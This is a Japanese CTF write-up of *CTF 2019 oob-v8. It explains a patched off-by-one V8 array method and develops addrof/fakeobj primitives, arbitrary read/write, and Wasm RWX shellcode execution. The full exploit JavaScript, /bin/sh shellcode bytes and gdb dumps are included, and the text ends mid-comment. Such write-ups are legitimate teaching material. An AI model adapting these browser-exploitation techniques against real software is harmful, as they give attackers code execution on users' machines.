+++
title = "Writeup: *CTF 2019 - oob-v8"
date = 2024-01-17

[taxonomies]
tags = ["CTF", "Writeup", "Pwn", "v8", "Browser", "JavaScript"]
+++

- 問題ファイルのミラー
	- [CTF-browser-challenges/oob-v8 at main · exd0tpy/CTF-browser-challenges](https://github.com/exd0tpy/CTF-browser-challenges/tree/main/oob-v8)
	- [CTF/2019/\*ctf at master · Changochen/CTF](https://github.com/Changochen/CTF/tree/master/2019/*ctf)
- CTFTime: [CTFtime.org / \*CTF 2019 / oob-v8](https://ctftime.org/task/8393)

<!-- more -->

## TL;DR

- 配列`l`に対して`l[l.length]`に相当するメモリ上の読み書きがfloat64で出来る`oob`というメソッドが実装されている
- float64とオブジェクトの配列に対してお互いにmapを書き換えることによってaddrofとfakeobjを実現する
- ある配列のelementsに相当するメモリ上に、偽装したfloat64の配列をfakeobjで作って、偽装配列のelementsを書き換えてAAR/Wを実現する
- Wasmのインスタンスを作成してRWX領域のアドレスを取得し、ArrayBufferのbacking_storeをそこへ向けてシェルコードを書き込む

## Prerequisite

- js Engineに対するエクスプロイト
	- JSを使ってfloat64とBigUInt64を相互変換する方法
	- addrof, fakeobjのようなプリミティブ
	- WasmのインスタンスからRWXを取得する方法
	- v8の構造
		- v8 heap内のポインタの表現方法
		- 配列のざっくりとしたメモリ構造 (ビルドによって異なるため、gdbで確認した結果は示す予定)
		- hidden class (mapと呼ばれているもの) が今回重要だが、これはある程度説明を加える
	- 参考 (前回): [v8 Exploitに入門する: is this pwn or web? - DownUnderCTF 2020](https://project-euphoria.dev/blog/41-my-first-v8-exploit/)

## Writeup

配布ファイルにはChromeとlibc, ldそしてv8へのパッチが入っている。また、パッチを当てたコミットハッシュは"6dc88c191f5ecc5389dc26efa3ca0907faef3598"らしい。

Browser Exploitの体を成しているが、今回はv8(それも面倒なのでd8)にだけ注目してPwnする。

v8のビルドで何度か詰まったが、Ubuntu 18.04で次に示すページの通りにやったら上手くいった

- [\*CTF 2019 - oob-v8 - Binary Exploitation](https://ir0nstone.gitbook.io/notes/types/browser-exploitation/ctf-2019-oob-v8)

### パッチ

今回当てられているパッチは次の通り

```txt
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}

 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();

     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

配列に対して`oob`というメソッドが追加されている。引数を与えた時とそうでない時で挙動が異なり、パッと見た感じはgetかsetの違いに見える。メソッド名、そして問題タイトルからも察せられるようにこれは範囲外参照のためのメソッドで添字のような箇所に、配列の長さに相当する`length`が指定されていることから自明なOff-by-Oneになっている。

重要なこととして参照先の`elements`が`FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());`という定義になっていることがある。これによって、`oob()`で返ってくる値と`oob(v)`で代入する値はどちらも64bitの浮動小数点数で指定する必要がある。以前解いたDownUnderCTF 2020 - is this pwn or webではOOBが2つ余分に出来た代わりに、オブジェクトの配列のlength番目とlength+1番目の要素は浮動小数点数ではなくオブジェクトとして取得あるいは代入する必要があったこととの大きな違いがこれである。

以下はこの`oob`メソッドを実際に使ってみた様子で、オブジェクトの配列である`l2`の方でも浮動小数点数が返ってきていることがわかる。

```txt
$ ./d8
V8 version 7.5.0 (candidate)
d8> let l1 = [1.1, 2.2];
undefined
d8> let l2 = [{X:1}, {Y:2}]
undefined
d8> l1.oob()
2.60306599200544e-310
d8> l2.oob()
2.6030659935983e-310
d8>
```

なお、デバッグビルドだと境界チェックをしっかり行うせいで`oob`メソッドが落ちるため、リリースビルドのd8をpwnするが、これだと`%DebugPrint`がオブジェクトの配置アドレスとマップのアドレスぐらいしか寄越さない縮小版になるので、オブジェクトの詳しい構造が必要になった時だけデバッグビルドの方を使っている。

さて、`oob`の挙動をある程度説明したところで、このメソッドが参照している箇所が何なのかを探る。適当なオブジェクトの配列を入れてメモリを覗いてみると次のようになっている(`%DebugPrint`とgdbで覗いた様子を併記)。

```txt
d8> %DebugPrint(obj_arr)
DebugPrint: 0x101fed78e3a1: [JSArray]
 - map: 0x3cc433902f79 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x0d5329cd1111 <JSArray[0]>
 - elements: 0x101fed78e389 <FixedArray[1]> [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x00e4ebf80c71 <FixedArray[0]> {
    #length: 0x0fbd8fe001a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x101fed78e389 <FixedArray[1]> {
           0: 0x101fed78e301 <Object map = 0x3cc43390ab39>
 }
 -------------------------------------------------
pwndbg> x/16gx 0x101fed78e3a1-1
0x101fed78e3a0: 0x00003cc433902f79      0x000000e4ebf80c71
0x101fed78e3b0: 0x0000101fed78e389      0x0000000100000000
0x101fed78e3c0: 0x000000e4ebf80941      0x0000000400000003
0x101fed78e3d0: 0xdeadbeed29386428      0x000000e4ebf80941
0x101fed78e3e0: 0x00000016e68fa846      0x7250677562654425
0x101fed78e3f0: 0x616f6c6628746e69      0xdead297272615f74
0x101fed78e400: 0x000000e4ebf802d1      0x0000000100000000
0x101fed78e410: 0x00000d5329cdff6b      0x000000e4ebf80851
pwndbg> x/16gx 0x101fed78e3a1-1-0x30
0x101fed78e370: 0x000000e4ebf80c71      0x0000101fed78e351
0x101fed78e380: 0x0000000100000000      0x000000e4ebf80801
0x101fed78e390: 0x0000000100000000      0x0000101fed78e301  <- elements[0]
0x101fed78e3a0: 0x00003cc433902f79      0x000000e4ebf80c71  <- elements[1] and element[2]
0x101fed78e3b0: 0x0000101fed78e389      0x0000000100000000
0x101fed78e3c0: 0x000000e4ebf80941      0x0000000400000003
0x101fed78e3d0: 0xdeadbeed29386428      0x000000e4ebf80941
0x101fed78e3e0: 0x00000016e68fa846      0x7250677562654425
pwndbg> 
```

オブジェクトの配列は0x101fed78e3a0に位置しており、先頭からmap, propertoes, elementsのポインタが格納されていて、それに続いてlengthに相当するような値が入っていることが確認出来る。elementsの方を見ると0x000000e4ebf80801, 0x0000000100000000(おそらくlengthに相当するようなもの)に続いて0番目の要素へのポインタ0x101fed78e301が入っており、その直下に配列があることがわかる。これより、`oob`の参照はこの配列のmapを読み書きすることになる。

注意点として、`let obj_arr = [{X:1}]`のような形でオブジェクトの配列を定義するとheapがこのようにならないことがある。あくまで予想だが、インタプリタがこの行を読んだ時に`obj_arr`のelementsのための領域を確保してから、`{X:1}`のための領域を確保し、そこから`obj_arr`のための領域を確保するため`obj_arr`のelementsと`obj_arr`自体との間に`{X:1}`のための領域が出来てしまうからだと考えられる。

余談だが、これ以外にも配列のサイズを要素の追加等で大きくしようとしたり、型変換を忘れる等で型が異なる値を添え字を指定して代入をしたりすることでメモリレイアウトが崩れてしまい、特に後者は気付きづらくて時間を大きく溶かしてまったことがある。

### mapについて

今回の問題でリーク出来るのは配列のmapと呼ばれる要素だったので、これが何であるかを軽く説明する。

mapはオブジェクトに関する情報が入っているもので、例えばどんな型であるかとか、プロパティを指定した時に値がメモリ上で値が入っている箇所のどの位置に存在するかといった情報を担っている(という暫定的な理解をしている)。したがって、もしオブジェクトのmapが別のものに変わってしまった場合は、要素の参照の際にどのメモリをどのように参照するか(値なのかポインタなのか)が全く異なってしまうことから、メモリバグに繋がる。

以下は浮動小数点数の配列とオブジェクトの配列を定義して`DebugPrint`を実行した様子である。

```txt
$ ./d8 --allow-natives-syntax
V8 version 7.5.0 (candidate)
d8> let l1 = [1.1, 2.2]
undefined
d8> let l2 = [{X:1}, {Y:2}]
undefined
d8> %DebugPrint(l1)
DebugPrint: 0x27cd4084dda9: [JSArray]
 - map: 0x3f5b52482ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x1a0953951111 <JSArray[0]>
 - elements: 0x27cd4084dd89 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x200616c00c71 <FixedArray[0]> {
    #length: 0x32f751d001a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x27cd4084dd89 <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
 0x3f5b52482ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
... (略)
d8> %DebugPrint(l2)
DebugPrint: 0x27cd408502b1: [JSArray]
 - map: 0x3f5b52482f79 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x1a0953951111 <JSArray[0]>
 - elements: 0x27cd408501f1 <FixedArray[2]> [PACKED_ELEMENTS]
 - length: 2
 - properties: 0x200616c00c71 <FixedArray[0]> {
    #length: 0x32f751d001a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x27cd408501f1 <FixedArray[2]> {
           0: 0x27cd40850211 <Object map = 0x3f5b5248ab39>
           1: 0x27cd40850261 <Object map = 0x3f5b5248ab89>
 }
 0x3f5b52482f79: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_ELEMENTS
... (略)
d8>
```

これら2つの変数のmapが異なっており、特にelements kindの部分が`PACKED_DOUBLE_ELEMENTS`と`PACKED_ELEMENTS`となっていることが確認出来る。この結果を元にそれぞれのelementsがどうなっているかを見ていく。まず浮動小数点数の配列である`l1`については次のようになっている。

```txt
pwndbg> x/16gx 0x27cd4084dd89-1
0x27cd4084dd88: 0x0000200616c014f9      0x0000000200000000
0x27cd4084dd98: 0x3ff199999999999a      0x400199999999999a
0x27cd4084dda8: 0x00003f5b52482ed9      0x0000200616c00c71
0x27cd4084ddb8: 0x000027cd4084dd89      0x0000000200000000
0x27cd4084ddc8: 0x0000200616c00941      0x00000adc4749f202
0x27cd4084ddd8: 0x6974636e7566280a      0x220a7b2029286e6f
0x27cd4084dde8: 0x6972747320657375      0x2f2f0a0a3b227463
0x27cd4084ddf8: 0x2065726f6d204120      0x6173726576696e75
pwndbg> p/f 0x3ff199999999999a
$1 = 1.1000000000000001
pwndbg> p/f 0x400199999999999a
$2 = 2.2000000000000002
pwndbg>
```

elementsのアドレスから0x10足した箇所から要素が入っていることが確認出来る。したがって浮動小数点数の配列は値がそのままelementsに格納されていると考えられる。

一方、オブジェクトの配列である`l2`については次のようになっている。

```txt
pwndbg> x/16gx 0x27cd408501f1-1
0x27cd408501f0: 0x0000200616c00801      0x0000000200000000
0x27cd40850200: 0x000027cd40850211      0x000027cd40850261
0x27cd40850210: 0x00003f5b5248ab39      0x0000200616c00c71
0x27cd40850220: 0x0000200616c00c71      0x0000000100000000
0x27cd40850230: 0x0000200616c00271      0x0000000000010001
0x27cd40850240: 0x00001a0953962231      0x00001a09539614e9
0x27cd40850250: 0x0000004400000000      0x0000000100000000
0x27cd40850260: 0x00003f5b5248ab89      0x0000200616c00c71
pwndbg>
```

elementsのアドレスから0x10足した箇所に要素が入っているのは同じであるが、こちらはポインタが入っている。

このことから、もし例えば`l2`のmap(`PACKED_ELEMENTS`)が`l1`のmap(`PACKED_DOUBLE_ELEMENTS`)になった場合、`l2[i]`といった参照はelementsの該当する要素を浮動小数点数とみなして参照するため、従来のオブジェクトのポインタを浮動小数点数として扱った値が返ってくると考えられる。続く節ではこのトリックを利用してaddrofとfakeobjを実現する方法を説明する。

### addrof/fakeobj

前節でmapをオブジェクトの配列と浮動小数点数の配列で入れ替えて参照方法を変えることに触れたが、これを実際に行ってaddrofとfakeobjを実現する。

まずaddrofについては、オブジェクトへのポインタを浮動小数点数として参照したいので次のような手順になる。

1. オブジェクトの配列を用意する
2. この配列のどこか(0番目で良い)にアドレスを知りたいオブジェクトを入れる
3. この配列のmapを浮動小数点数の配列のものに変える
4. 2.で入れた添字にアクセスして値を浮動小数点数として得る

実際にこれを行った様子が次である。

```txt
$ ./d8 --allow-natives-syntax
V8 version 7.5.0 (candidate)
d8> let tmp = {X:1}
undefined
d8> let float_arr = [1.1]
undefined
d8> let obj_arr = [tmp]
undefined
d8> let float_map = float_arr.oob()
undefined
d8> let obj_map = obj_arr.oob()
undefined
d8> let target_obj = {Y:2}
undefined
d8> obj_arr[0] = target_obj
{Y: 2}
d8> obj_arr.oob(float_map)
undefined
d8> let target_addr = obj_arr[0]
undefined
d8> target_addr
9.6476255326233e-311
d8> %DebugPrint(target_obj)
0x11c27c950589 <Object map = 0x3ccd35a8ab89>
{Y: 2}
d8>
```

64bitの浮動小数点数と符号なし整数の変換用コードを挟んで居ないため分かりづらいが、`target_obj`のアドレスである0x11c27c950589を浮動小数点数として扱うと、9.6476255326233065e-311という結果が得られ[^1]、(表記の都合上完全に一致ではないが)`target_addr`と一致することがわかる。

もう一方のfakeobjについては、浮動小数点数として入っている値をポインタとして見たいのでこれを反転させたような手順になる。

1. 浮動小数点数の配列を用意する
2. この配列のどこか(0番目で良い)に偽装オブジェクトを作成したいアドレスを浮動小数点数として代入する
3. この配列のmapをオブジェクトの配列のものに変える
4. 2.で入れた添字にアクセスしてオブジェクトを得る

(実現していることを示すのには偽装されるオブジェクトに対応するバイト列を仕込まなければならず、手間がかかるのでここでは略)

これらを元にして、2つのプリミティブを実現するコードは次のようになる。

```javascript
let tmp_obj = {X:1};
let float_arr = [1.1];
let obj_arr = [tmp_obj];  // fxxk v8 heap

let float_map = float_arr.oob();
let obj_map = obj_arr.oob();

// addrof
function addrof(obj) {
    obj_arr[0] = obj;
    obj_arr.oob(float_map);

    let v = obj_arr[0];
    obj_arr.oob(obj_map);

    return f2i(v);
}

// fakeobj
// addr: address of array that includes float64 as bytes
function fakeobj(addr) {
    float_arr[0] = i2f(addr);
    float_arr.oob(obj_map);

    let fake = float_arr[0]
    float_arr.oob(float_map);

    return fake;
}
```

fakeobjプリミティブの性能を活かすにはちょっと手間が必要で、ここでは次の課題が残っている

- オブジェクトとして有効なバイト列をどうやってメモリ上に配置するか
- そのように配置したバイト列のアドレス、つまりfakeobjで指定するアドレスをどのようにして知るか

次の節ではこの問題を解決してAARとAAWを実現する方法を説明する。

### AAR/W用の配列を偽装

前節で残したfakeobjに関する2つの問題に対して浮動小数点数の配列と見なされるオブジェクトを偽装することを目標とする。

まずメモリ上に配列として有効なバイト列を展開することから考える。これは割と簡単で、それらを浮動小数点数の配列として定義すれば、その配列のelements(の値がある箇所)に対応するバイト列が書き込まれる。メモリ上で配列を構成する要素はアドレスが小さい位置から順に次のようになることを最初の方で確認したので再掲する。

- mapへのポインタ
- propertiesへのポインタ(？)
- elementsへのポインタ
- length (を左に32bitシフトした値)

よって`let X = [float_map, x, y, 0x1000000000000000]`というような配列を用意して(定義時はx,yの値はおそらく任意で問題なく、特にyはオブジェクト偽装後に変更する)、この配列の値が入っている箇所に対してfakeobjを行えば、サイズが0x10000000でelementsがyであるような浮動小数点数の配列が得られると考えられる。

特に変なことをせず、elementsがオブジェクトの真上に来るような場合のメモリレイアウトは次の通り。

```txt
         addr              | 0x0                  | +0x8
---------------------------|----------------------|------------------------
-0x30 (elements of X)      | ????                 |   ????                    
-0x20 (addrof fake, &X[0]) | float_map            | x (properties of fake)
-0x10                      | y (elements of fake) | 0x1000000000000000
0     (addrof X)           | float_map            | properties of X
+0x10                      | elements (-0x30)     | 0x4 (length of X)
```

これで残る問題であるfakeobjで指定するアドレスを知るという問題も解決する。既にaddrofが実現しているのでXに対して適用して得られた値から0x20を引けば、メモリ上に展開した偽装オブジェクトに相当するバイト列のアドレスが得られる。

以下ではこのアドレスにfakeobjでオブジェクトを偽装したとして、このようにして偽装されたオブジェクトの名前を`fake`とする。

更に嬉しいことに、`X`に含まれる値が`fake`に重なっていることから、`X[0]`は`fake`のアドレスへの参照になり、同様にして`X[2]`は`fake`のアドレス+0x10、つまり`fake`のelementsへの参照になる。これによって`fake`のelememtsを好きな値に書き換えることが出来るようになったため、`fake[0]`がどこを参照するかをコントロール出来るようになる。

配列の要素の先頭が、elementsに入れたアドレスから0x10だけ足した箇所になることに注意すると、`X[2] = aarw_target_addr - 0x10n`[^2]のような代入を行えば、`fake[0]`はこの`aarw_target_addr`を参照するようになり、ここへの読み書きが実現する。

これを実現するコードは次の通り

```javascript
// fake_arr[3]: length (0x10000000 as float64)
let fake_arr = [float_map, 10.10, 11.11, 1.2882297539194267e-231];
let fake_addr = addrof(fake_arr);

// array of float64
let aarw_arr = fakeobj(fake_addr - 0x30n + 0x10n);

function aar(addr) {
    fake_arr[2] = i2f(addr-0x10n);

    return f2i(aarw_arr[0]);
}

// worked only for address in v8 heap?
// not worked for RWX (SIGSEGV)
function aaw(addr, v) {
    fake_arr[2] = i2f(addr-0x10n);

    aarw_arr[0] = i2f(v);
}

```

実際に、後に用いるWasmのインスタンスによって生成されるRWX領域のアドレスをAARを用いる次のようなコードで取得してみる。ここで、`wasm_instance`内のRWX領域を指すポインタの位置は事前にデバッガで調べており、この環境では0x88であった。

```javascript
let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;

let rwx_addr = aar(addrof(wasm_instance) + 0x88n);
hexPrint(rwx_addr)
```

結果とgdbでのメモリマップの様子は次のようになり、確かにRWX領域のアドレスが得られていることが確認できる。

```txt
$ ./d8 --shell exploit.js
0x220b2189f000
V8 version 7.5.0 (candidate)
d8>
---------------------------------------------------------------------------------
pwndbg> vmmap 0x220b2189f000
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x220b2189f000     0x220b218a0000 rwxp     1000      0 [anon_220b2189f] +0x0
```

### RWX領域への書き込み

シェルを取るために、Wasmのインスタンスを作ることによってRWX領域を確保し、そこにシェルコードを流すという方法を用いるが、このようにして作ったAAWはポインタが圧縮されていないにも関わらず、v8 heapの外側に対して用いるとSegmentation Faultで落ちる。

RWX領域はv8 heapの外側にあるのでこのままではシェルコードを書き込むことが出来ないがこれの回避策もよく知られており、`ArrayBuffer`のオブジェクトはv8 heap内に存在する一方でバッファのバイト列を指す先(backing_store)はv8 heapの外側にあり普通のポインタとして扱えることから、ここをRWX領域に書き換えて読み書きを行う。

このためにはbacking_storeがメモリ構造において`ArrayBuffer`オブジェクトのどのオフセットにあるかを調べる必要がある。次のようなコードで`ArrayBuffer`である`buf`を定義し、そのアドレスを調べてみる。

```txt
$ ./d8 --allow-natives-syntax
V8 version 7.5.0 (candidate)
d8> let buf = new ArrayBuffer(0x400)
undefined
d8> let dv = new DataView(buf)
undefined
d8> dv.setBigUint64(0, 0xdeadbeefcafebaben, true)
undefined
d8> %DebugPrint(buf)
0x361cf8a4dd51 <ArrayBuffer map = 0x388dcf2c21b9>
[object ArrayBuffer]
d8>
```

`buf`は0x361cf8a4dd50にあるようである。バッファが指す先には0xdeadbeefcafebabeを書き込んだのでこの値を含むメモリを探すと、v8 heapの外側であれば、0x560b41de0b70に存在することがわかる(下図)。したがって、`buf`付近のアドレスでこれを含んでいる場所を探すと、`buf`のアドレスから0x20足した場所にあることがわかるのでここをv8 heap内のAAWでRWX領域へのアドレスへと書き換える。

```txt
pwndbg> search -8 0xdeadbeefcafebabe
Searching for value: b'\xbe\xba\xfe\xca\xef\xbe\xad\xde'
[anon_312fec8c0] 0x312fec8e1880 0xdeadbeefcafebabe
[heap]          0x560b41de0b70 0xdeadbeefcafebabe
warning: Unable to access 16000 bytes of target memory at 0x7f11844afd07, halting search.
warning: Unable to access 16007 bytes of target memory at 0x7f11846c9000, halting search.
warning: Unable to access 16007 bytes of target memory at 0x7f1184a67000, halting search.
warning: Unable to access 16007 bytes of target memory at 0x7f1184c6f000, halting search.
warning: Unable to access 16000 bytes of target memory at 0x7f1184e91d07, halting search.
pwndbg> x/16gx 0x361cf8a4dd51-1
0x361cf8a4dd50: 0x0000388dcf2c21b9      0x0000297065e00c71
0x361cf8a4dd60: 0x0000297065e00c71      0x0000000000000400
0x361cf8a4dd70: 0x0000560b41de0b70      0x0000000000000002
0x361cf8a4dd80: 0x0000000000000000      0x0000000000000000
0x361cf8a4dd90: 0x0000297065e00941      0x00000adcea57b396
0x361cf8a4dda0: 0x6974636e7566280a      0x220a7b2029286e6f
0x361cf8a4ddb0: 0x6972747320657375      0x2f2f0a0a3b227463
0x361cf8a4ddc0: 0x2065726f6d204120      0x6173726576696e75
pwndbg>
```

こうして、`buf`は無事にRWX領域を指すようになったので`DataView`や`TypedArray`を用いてシェルコードを書き込み、Wasmのコードを実行してシェルを得る。

```javascript
let aaw_buf = new ArrayBuffer(0x400);
let dv = new DataView(aaw_buf);
let backing_store_addr = addrof(aaw_buf) + 0x20n;
aaw(backing_store_addr, rwx_addr)

let shellcode = [72, 49, 210, 82, 72, 184, 47, 98, 105, 110, 47, 47, 115, 104, 80, 72, 137, 231, 82, 87, 72, 137, 230, 72, 141, 66, 59, 15, 5]

for (let i = 0; i < shellcode.length; i++) {
    dv.setUint8(i, shellcode[i]);
}

// Win!!
f();
```

## Code

- gist: [\*CTF 2019 - oob-v8](https://gist.github.com/Xornet-Euphoria/1fc48bcb96d5c2e5d8becca0f910a474)

```javascript
// utility functions

// convert float64 <-> uint64
let buf = new ArrayBuffer(8);
let float_buf = new Float64Array(buf);
let uint_buf = new BigUint64Array(buf);

function f2i(v) {
    float_buf[0] = v;
    return uint_buf[0];
}

function i2f(v) {
    uint_buf[0] = v;
    return float_buf[0];
}

// print utils
function hexPrint(v) {
    console.log("0x" + v.toString(16));
}

// --------------------------------------------------

let tmp_obj = {X:1};
let float_arr = [1.1];
// fxxk v8 heap
// if this code is replaced to `obj_arr = [{X:1}]`
// maybe {X:1} will be allocated before obj_arr
let obj_arr = [tmp_obj];  // fxxk v8 heap

/*
- from x64.debug (but debug build interpreter checks the boundaries)
d8> %DebugPrint(obj_arr)
DebugPrint: 0x101fed78e3a1: [JSArray]
 - map: 0x3cc433902f79 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x0d5329cd1111 <JSArray[0]>
 - elements: 0x101fed78e389 <FixedArray[1]> [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x00e4ebf80c71 <FixedArray[0]> {
    #length: 0x0fbd8fe001a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x101fed78e389 <FixedArray[1]> {
           0: 0x101fed78e301 <Object map = 0x3cc43390ab39>
 }
 -------------------------------------------------
pwndbg> x/16gx 0x101fed78e3a1-1
0x101fed78e3a0: 0x00003cc433902f79      0x000000e4ebf80c71
0x101fed78e3b0: 0x0000101fed78e389      0x0000000100000000
0x101fed78e3c0: 0x000000e4ebf80941      0x0000000400000003
0x101fed78e3d0: 0xdeadbeed29386428      0x000000e4ebf80941
0x101fed78e3e0: 0x00000016e68fa846      0x7250677562654425
0x101fed78e3f0: 0x616f6c6628746e69      0xdead297272615f74
0x101fed78e400: 0x000000e4ebf802d1      0x0000000100000000
0x101fed78e410: 0x00000d5329cdff6b      0x000000e4ebf80851
pwndbg> x/16gx 0x101fed78e3a1-1-0x30
0x101fed78e370: 0x000000e4ebf80c71      0x0000101fed78e351
0x101fed78e380: 0x0000000100000000      0x000000e4ebf80801
0x101fed78e390: 0x0000000100000000      0x0000101fed78e301  <- elements[0]
0x101fed78e3a0: 0x00003cc433902f79      0x000000e4ebf80c71  <- elements[1] and element[2]
0x101fed78e3b0: 0x0000101fed78e389      0x0000000100000000
0x101fed78e3c0: 0x000000e4ebf80941      0x0000000400000003
0x101fed78e3d0: 0xdeadbeed29386428      0x000000e4ebf80941
0x101fed78e3e0: 0x00000016e68fa846      0x7250677562654425
pwndbg> 
*/

let float_map = float_arr.oob();
let obj_map = obj_arr.oob();

// addrof
function addrof(obj) {
    obj_arr[0] = obj;
    obj_arr.oob(float_map);

    let v = obj_arr[0];
    obj_arr.oob(obj_map);

    return f2i(v);
}

// fakeobj
// addr: address of array that includes float64 as bytes
function fakeobj(addr) {
    float_arr[0] = i2f(addr);
    float_arr.oob(obj_map);

    let fake = float_arr[0]
    float_arr.oob(float_map);

    return fake;
}

/*
$ ./d8 --shell --allow-natives-syntax exploit.js 
V8 version 7.5.0 (candidate)
d8> addrof(fake_arr)
46866547141369n
d8> %DebugPrint(fake_arr)
0x2a9ff7e4eaf9 <JSArray[4]>
[9.9, 10.1, 11.11, 12.12]
d8> 
pwndbg> x/16gx 0x2a9ff7e4eaf9-1
0x2a9ff7e4eaf8: 0x0000373223342ed9      0x00003a2520880c71
0x2a9ff7e4eb08: 0x00002a9ff7e4eac9      0x0000000400000000  <- elements and length(?)
0x2a9ff7e4eb18: 0x00003a2520880941      0x0000000400000003
0x2a9ff7e4eb28: 0x0000000029386428      0x00003a2520880941
0x2a9ff7e4eb38: 0x000000103a76c8b6      0x6628666f72646461
0x2a9ff7e4eb48: 0x297272615f656b61      0x00003a25208802d1
0x2a9ff7e4eb58: 0x0000000100000000      0x00002c43bde20303
0x2a9ff7e4eb68: 0x00003a2520880851      0x0000000400000000
pwndbg> x/16gx 0x2a9ff7e4eaf9-1-0x30
0x2a9ff7e4eac8: 0x00003a25208814f9      0x0000000400000000
0x2a9ff7e4ead8: 0x4023cccccccccccd      0x4024333333333333  <- elements[0] and elements[1]
0x2a9ff7e4eae8: 0x40263851eb851eb8      0x40283d70a3d70a3d
0x2a9ff7e4eaf8: 0x0000373223342ed9      0x00003a2520880c71
0x2a9ff7e4eb08: 0x00002a9ff7e4eac9      0x0000000400000000
0x2a9ff7e4eb18: 0x00003a2520880941      0x0000000400000003
0x2a9ff7e4eb28: 0x0000000029386428      0x00003a2520880941
0x2a9ff7e4eb38: 0x000000103a76c8b6      0x6628666f72646461
pwndbg> 
 */

// fake_arr[3]: length (0x10000000 as float64)
let fake_arr = [float_map, 10.10, 11.11, 1.2882297539194267e-231];
let fake_addr = addrof(fake_arr);

// array of float64
let aarw_arr = fakeobj(fake_addr - 0x30n + 0x10n);

function aar(addr) {
    fake_arr[2] = i2f(addr-0x10n);

    return f2i(aarw_arr[0]);
}

// worked only for address in v8 heap?
// not worked for RWX (SIGSEGV)
function aaw(addr, v) {
    fake_arr[2] = i2f(addr-0x10n);

    aarw_arr[0] = i2f(v);
}

/*
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
     0x4b5f3858000      0x4b5f3860000 rw-p     8000      0 [anon_4b5f3858]
     0x704561c0000      0x70456200000 rw-p    40000      0 [anon_704561c0]
     0xa0676791000      0xa06767c0000 ---p    2f000      0 [anon_a0676791]
     0xa06767c0000      0xa06767c1000 rw-p     1000      0 [anon_a06767c0]
     0xa06767c1000      0xa06767c2000 ---p     1000      0 [anon_a06767c1]
